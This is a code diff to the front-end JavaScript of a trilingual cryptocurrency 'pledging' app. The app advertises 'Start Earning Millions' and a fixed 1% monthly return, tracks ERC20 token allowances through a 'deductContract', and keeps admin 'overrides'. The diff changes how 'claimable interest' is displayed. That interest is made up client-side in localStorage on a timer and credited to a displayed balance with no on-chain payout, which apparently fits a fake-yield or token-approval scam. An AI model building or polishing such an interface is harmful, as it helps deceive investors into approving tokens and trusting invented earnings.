@@ -15,20 +15,19 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-// DOM 元素（使用 let 允許重新賦值）
+// DOM 元素
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
 let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
-let modalClaimableETH, modalPendingETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
+let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
 let elements = {};
 
 // 變數
 let provider, signer, userAddress;
-let deductContract, usdtContract, usdcContract, wrethContract;
+let deductContract, usdtContract, usdcContract, wethContract;
 let pledgedAmount = 0;
 let lastPayoutTime = null;
 let totalGrossOutput = 0;
-let currentCycleInterest = 0;
 let interestInterval = null;
 let nextBenefitInterval = null;
 let claimInterval = null;
@@ -40,7 +39,6 @@ let authorizedToken = 'USDT';
 let allData = { users: {}, overrides: {}, allowances: {}, pledges: {}, lastUpdated: 0 };
 const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
 window.currentClaimable = 0;
-window.currentPending = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 
@@ -50,8 +48,8 @@ const translations = {
     subtitle: 'Start Earning Millions',
     tabLiquidity: 'Liquidity',
     tabPledging: 'Pledging',
-    grossOutputLabel: 'Gross Output',
-    cumulativeLabel: 'Cumulative',
+    grossOutputLabel: 'Claimable Output',
+    cumulativeLabel: 'Claimable',
     walletBalanceLabel: 'Wallet Balance',
     accountBalanceLabel: 'Account Balance',
     nextBenefit: 'Next Benefit: 00:00:00',
@@ -89,7 +87,6 @@ const translations = {
       <p>5. Pledging independent.</p>
     `,
     modalClaimableLabel: 'Claimable',
-    modalPendingLabel: 'Pending',
     modalSelectedTokenLabel: 'Selected Token',
     modalEquivalentValueLabel: 'Equivalent Value'
   },
@@ -98,8 +95,8 @@ const translations = {
     subtitle: '開始賺取數百萬',
     tabLiquidity: '流動性',
     tabPledging: '質押',
-    grossOutputLabel: '總產出',
-    cumulativeLabel: '累計',
+    grossOutputLabel: '可領取產出',
+    cumulativeLabel: '可領取',
     walletBalanceLabel: '錢包餘額',
     accountBalanceLabel: '帳戶餘額',
     nextBenefit: '下次收益: 00:00:00',
@@ -137,7 +134,6 @@ const translations = {
       <p>5. 質押獨立運作。</p>
     `,
     modalClaimableLabel: '可領取',
-    modalPendingLabel: '已累積（未到期）',
     modalSelectedTokenLabel: '選擇代幣',
     modalEquivalentValueLabel: '等值金額'
   },
@@ -146,8 +142,8 @@ const translations = {
     subtitle: '开始赚取数百万',
     tabLiquidity: '流动性',
     tabPledging: '质押',
-    grossOutputLabel: '总产出',
-    cumulativeLabel: '累计',
+    grossOutputLabel: '可领取产出',
+    cumulativeLabel: '可领取',
     walletBalanceLabel: '钱包余额',
     accountBalanceLabel: '账户余额',
     nextBenefit: '下次收益: 00:00:00',
@@ -185,7 +181,6 @@ const translations = {
       <p>5. 质押独立运作。</p>
     `,
     modalClaimableLabel: '可领取',
-    modalPendingLabel: '已累计（未到期）',
     modalSelectedTokenLabel: '选择代币',
     modalEquivalentValueLabel: '等值金额'
   }
@@ -198,7 +193,6 @@ function log(message, type = 'info') {
   const timestamp = new Date().toLocaleTimeString();
   const prefix = { info: 'Info', success: 'Success', error: 'Error', send: 'Send', receive: 'Receive' }[type] || 'Info';
   console.log(`[${timestamp}] ${prefix} ${message}`);
-
   const logContent = document.getElementById('logContent');
   const logContainer = document.getElementById('logContainer');
   if (logContent && logContainer) {
@@ -233,7 +227,6 @@ function getElements() {
   confirmClaim = document.getElementById('confirmClaim');
   cancelClaim = document.getElementById('cancelClaim');
   modalClaimableETH = document.getElementById('modalClaimableETH');
-  modalPendingETH = document.getElementById('modalPendingETH');
   modalSelectedToken = document.getElementById('modalSelectedToken');
   modalEquivalentValue = document.getElementById('modalEquivalentValue');
   modalTitle = document.getElementById('modalTitle');
@@ -377,7 +370,7 @@ async function loadUserDataFromServer() {
 
       log(`當前用戶資料同步成功`, 'success');
     }
-    await updateInterest();
+    updateClaimableDisplay();
   } catch (error) {
     log(`載入失敗: ${error.message}`, 'error');
   }
@@ -531,103 +524,10 @@ async function refreshEthPrice() {
   }
 }
 
-function calculatePayoutInterest() {
-  if (pledgedAmount <= 0) return 0;
-  return pledgedAmount * (MONTHLY_RATE / 60);
-}
-
 function initializeMiningData() {
   localStorage.setItem('totalGrossOutput', '0');
   localStorage.setItem('claimable', '0');
   localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
-}
-
-async function updateInterest() {
-  if (!grossOutputValue || !cumulativeValue) {
-    if (!await retryDOMAcquisition()) return;
-  }
-  if (!userAddress || pledgedAmount <= 0) {
-    grossOutputValue.textContent = '0 ETH';
-    cumulativeValue.textContent = '0 ETH';
-    window.currentClaimable = 0;
-    window.currentPending = 0;
-    return;
-  }
-  const now = Date.now();
-  const etOffset = getETOffsetMilliseconds();
-  const nowET = new Date(now + etOffset);
-  totalGrossOutput = parseFloat(localStorage.getItem('totalGrossOutput')) || 0;
-  let claimable = parseFloat(localStorage.getItem('claimable')) || 0;
-  const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
-  let lastPayoutTime = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
-  if (lastPayoutTime === 0) {
-    lastPayoutTime = Date.now() - 24*60*60*1000;
-    localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
-  }
-  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
-  const lastPayoutET = new Date(lastPayoutTime + etOffset);
-  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
-  if (isPayoutTime && !wasPayoutTime && now - lastPayoutTime > 60000) {
-    totalGrossOutput += cycleInterest;
-    claimable += cycleInterest;
-    localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
-    localStorage.setItem('claimable', claimable.toString());
-    localStorage.setItem('lastPayoutTime', now.toString());
-    await saveUserData();
-  }
-  const nextHour = nowET.getHours() < 12 ? 12 : 24;
-  const nextPayoutET = new Date(nowET);
-  nextPayoutET.setHours(nextHour, 0, 0, 0);
-  const msToNext = nextPayoutET.getTime() - etOffset - now;
-  const progress = Math.max(0, 1 - (msToNext / (12 * 60 * 60 * 1000)));
-  const pending = cycleInterest * progress;
-  const cumulative = claimable + pending;
-  grossOutputValue.textContent = `${totalGrossOutput.toFixed(7)} ETH`;
-  cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
-  window.currentClaimable = claimable;
-  window.currentPending = pending;
-}
-
-function updateClaimModalLabels() {
-  const claimLabels = {
-    'en': { title: 'Claim', claimable: 'Claimable', pending: 'Pending', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
-    'zh-Hant': { title: '領取', claimable: '可領取', pending: '已累積（未到期）', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
-    'zh-Hans': { title: '领取', claimable: '可领取', pending: '已累计（未到期）', selectedToken: '选择代币', equivalentValue: '等值金额' }
-  };
-  const labels = claimLabels[currentLang];
-  if (modalTitle) modalTitle.textContent = labels.title;
-  const labelElements = document.querySelectorAll('.claim-info .label');
-  if (labelElements.length === 4) {
-    labelElements[0].textContent = labels.claimable;
-    labelElements[1].textContent = labels.pending;
-    labelElements[2].textContent = labels.selectedToken;
-    labelElements[3].textContent = labels.equivalentValue;
-  }
-}
-
-async function claimInterest() {
-  const token = authorizedToken;
-  await refreshEthPrice();
-  updateClaimModalLabels();
-  if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
-  if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-  if (modalSelectedToken) modalSelectedToken.textContent = token;
-  const equivalent = window.currentClaimable * ethPriceCache.price;
-  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
-  if (claimModal) claimModal.style.display = 'flex';
-  if (claimInterval) clearInterval(claimInterval);
-  claimInterval = setInterval(async () => {
-    await updateInterest();
-    if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
-    if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-    const eq = window.currentClaimable * ethPriceCache.price;
-    if (modalEquivalentValue) modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
-  }, 1000);
-}
-
-function closeClaimModal() {
-  if (claimModal) claimModal.style.display = 'none';
-  if (claimInterval) clearInterval(claimInterval);
 }
 
 function getETOffsetMilliseconds() {
@@ -639,6 +539,76 @@ function getETOffsetMilliseconds() {
   const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
   const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
   return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
+}
+
+function updateClaimableDisplay() {
+  if (!grossOutputValue || !cumulativeValue) return;
+  const claimable = window.currentClaimable || 0;
+  grossOutputValue.textContent = `${claimable.toFixed(7)} ETH`;
+  cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
+}
+
+async function updateInterest() {
+  if (!userAddress || pledgedAmount <= 0) {
+    window.currentClaimable = 0;
+    updateClaimableDisplay();
+    return;
+  }
+
+  const now = Date.now();
+  const etOffset = getETOffsetMilliseconds();
+  const nowET = new Date(now + etOffset);
+  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
+  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
+  const lastPayoutET = new Date(lastPayout + etOffset);
+  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
+
+  if (isPayoutTime && !wasPayoutTime && now - lastPayout > 60000) {
+    const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
+    window.currentClaimable += cycleInterest;
+    localStorage.setItem('claimable', window.currentClaimable.toString());
+    localStorage.setItem('lastPayoutTime', now.toString());
+    await saveUserData();
+    log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
+  }
+
+  updateClaimableDisplay();
+}
+
+function updateClaimModalLabels() {
+  const claimLabels = {
+    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
+    'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
+    'zh-Hans': { title: '领取', claimable: '可领取', selectedToken: '选择代币', equivalentValue: '等值金额' }
+  };
+  const labels = claimLabels[currentLang];
+  if (modalTitle) modalTitle.textContent = labels.title;
+  const labelElements = document.querySelectorAll('.claim-info .label');
+  if (labelElements.length >= 3) {
+    labelElements[0].textContent = labels.claimable;
+    labelElements[1].textContent = labels.selectedToken;
+    labelElements[2].textContent = labels.equivalentValue;
+  }
+}
+
+async function claimInterest() {
+  await refreshEthPrice(); // 打開即更新價格
+  updateClaimModalLabels();
+
+  const claimable = window.currentClaimable || 0;
+  if (modalClaimableETH) modalClaimableETH.textContent = `${claimable.toFixed(7)} ETH`;
+  if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
+
+  const tokenPrice = authorizedToken === 'WETH' ? ethPriceCache.price : 1;
+  const equivalent = claimable * tokenPrice;
+  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
+
+  if (claimModal) claimModal.style.display = 'flex';
+}
+
+function closeClaimModal() {
+  if (claimModal) claimModal.style.display = 'none';
+  if (claimInterval) clearInterval(claimInterval);
 }
 
 function updateNextBenefitTimer() {
@@ -1052,13 +1022,19 @@ document.addEventListener('DOMContentLoaded', () => {
         updateStatus(translations[currentLang].noClaimable, true);
         return;
       }
-      localStorage.setItem('claimable', '0');
-      const claimed = parseFloat(localStorage.getItem('claimed') || '0') + claimable;
-      localStorage.setItem('claimed', claimed.toString());
+
+      // 轉入帳戶餘額
       accountBalance[authorizedToken] += claimable;
+      window.currentClaimable = 0;
+
+      // 更新本地
+      localStorage.setItem('claimable', '0');
+      localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
+
       await saveUserData();
-      await updateInterest();
+      updateClaimableDisplay();
       await forceRefreshWalletBalance();
+
       updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
     });
   }
